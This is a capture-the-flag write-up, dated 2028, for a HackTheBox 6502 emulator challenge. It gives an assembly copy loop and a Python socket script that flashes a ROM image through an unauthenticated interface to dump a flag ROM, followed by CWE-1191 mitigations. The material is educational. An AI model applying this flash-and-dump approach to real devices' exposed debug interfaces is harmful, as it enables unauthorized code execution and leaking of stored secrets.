---
layout: post
title: "Six Five O Two"
date: 2028-03-29 09:00:00 -0500
categories: [HackTheBox, Challenges, Hardware]
tags: [hackthebox, challenge, hardware, 6502, firmware, mmio, cwe-1191]
description: "A networked 6502 emulator hands you a firmware-flashing interface but never prints the flag ROM. With no memory isolation between attacker code and secrets, you just flash a 16-byte program that copies the flag ROM into the console MMIO and read it out."
---

## Overview

Six Five O Two is a HackTheBox Hardware challenge (Medium). You connect to a networked emulator of an ancient **MOS 6502 CPU** — a "6502 FLASHING TOOL V2" — that lets you flash and run arbitrary bytecode. The flag lives in a ROM the CPU can read but the tool never prints. Because there is no isolation between the code you flash and the secret ROM, the whole solve is to flash a tiny program that copies the flag into the console's memory-mapped output and read it back. This is [CWE-1191](https://cwe.mitre.org/data/definitions/1191.html) — an exposed programming/debug interface with improper access control.

## The technique

The tool exposes four commands:

- `PRINTL` — prints the memory map
- `FLASH <hex>` — loads your hex bytecode into ROM; the CPU is **reset after every flash**
- `RUN N` — executes N opcodes on the CPU
- `CONSOLE` — displays the output console

`PRINTL` gives away the entire layout:

```
 RAM        $0000-$3FFF
 FLAG ROM   $4000-$401F   <- "HTB{ .... ...}" lives here (32 bytes)
 CONSOLE    $6000-$601F   <- memory-mapped output (what CONSOLE prints)
 CODE ROM   $8000-$FFFF   <- where OUR flashed bytecode runs
```

The flag sits in a ROM at `$4000-$401F` that the CPU can *read* but the interface never *prints*. Meanwhile we get to flash **arbitrary 6502 code** into `$8000-$FFFF`, and there is no memory protection between our code and that flag ROM. The console at `$6000-$601F` is memory-mapped I/O — whatever the CPU stores there is what `CONSOLE` shows. So: flash a program that copies the 32 flag bytes from `$4000` into `$6000`, run it, read the console.

## Solution

The 6502 program is a simple indexed copy loop:

```asm
        LDX #$00        ; index = 0
loop:   LDA $4000,X     ; A = flag_rom[index]
        STA $6000,X     ; console[index] = A
        INX             ; index++
        CPX #$20        ; done all 32 bytes?
        BNE loop        ; no -> repeat
        JMP *           ; halt (spin in place)
```

There's one hardware detail that trips people up: `FLASH` resets the CPU, and a real 6502 does **not** simply start at `$8000` — on reset it loads the program counter from the **reset vector at `$FFFC/$FFFD`** (little-endian). So we flash a full 32 KB ROM image, NOP-filled (`0xEA`), with our code at the start and bytes `00 80` placed at ROM offset `$7FFC/$7FFD` so the vector points at `$8000`.

Create `solve.py`:

```python
import socket, time, sys
host, port = sys.argv[1], int(sys.argv[2])

# 6502 program @ $8000: copy 32 bytes from $4000 (flag ROM) to $6000 (console)
prog = bytes([
    0xA2, 0x00,          # LDX #$00
    0xBD, 0x00, 0x40,    # LDA $4000,X
    0x9D, 0x00, 0x60,    # STA $6000,X
    0xE8,                # INX
    0xE0, 0x20,          # CPX #$20   (32 bytes)
    0xD0, 0xF5,          # BNE loop   (-11)
    0x4C, 0x0D, 0x80,    # JMP $800D  (halt spin)
])
rom = bytearray([0xEA]) * 0x8000         # 32K ROM ($8000-$FFFF), NOP-filled
rom[0:len(prog)] = prog
rom[0x7FFC] = 0x00; rom[0x7FFD] = 0x80   # reset vector -> $8000

s = socket.socket(); s.connect((host, port))
s.sendall(b"FLASH " + rom.hex().upper().encode() + b"\nRUN 300\nCONSOLE\n")
time.sleep(3); s.settimeout(5)
print(s.recv(200000).decode("latin1"))
```

Run it against the instance and `CONSOLE` prints the copied bytes as hex:

```
48 54 42 7B 36 35 30 32 5F 63 70 75 5F 63 30 6E   = HTB{6502_cpu_c0n
37 32 30 31 5F 6D 34 35 37 33 32 21 34 32 23 7D   = 7201_m45732!42#}
```

Decode with `bytes.fromhex(...)` and the flag is `HTB{...}`.

One practical gotcha: the challenge instance accepts a **single TCP connection** and then refuses further connects — even a liveness probe burns it. Send `FLASH` + `RUN` + `CONSOLE` in one socket session, and spawn a fresh instance before each attempt.

## Why it worked

Two independent design failures line up. The programming/debug interface is **unauthenticated** and **writable**, so anyone can load and execute arbitrary firmware on the CPU. And there is **no memory isolation** between the region we flash (`$8000+`) and the secret ROM (`$4000`), so our flashed code can read the flag directly. Either one alone would stop the attack; together they turn the flasher into a full memory-disclosure primitive.

## Fix / defense

- **Gate the programming/debug interface** — authenticate it, require signed firmware images verified before execution, and ship it fuse-locked or disabled in production. An unauthenticated flash-writer is an arbitrary-code-execution primitive.
- **Enforce memory isolation** — an MPU or secure-world boundary so flashed/attacker code physically cannot read the region holding secrets. Keep secrets behind an access-controlled boundary, not in CPU-addressable ROM sitting next to writable code.

This is the same [CWE-1191](https://cwe.mitre.org/data/definitions/1191.html) weakness family as a read-only UART-console leak — but a *writable* interface upgrades it from passive disclosure to arbitrary code execution.
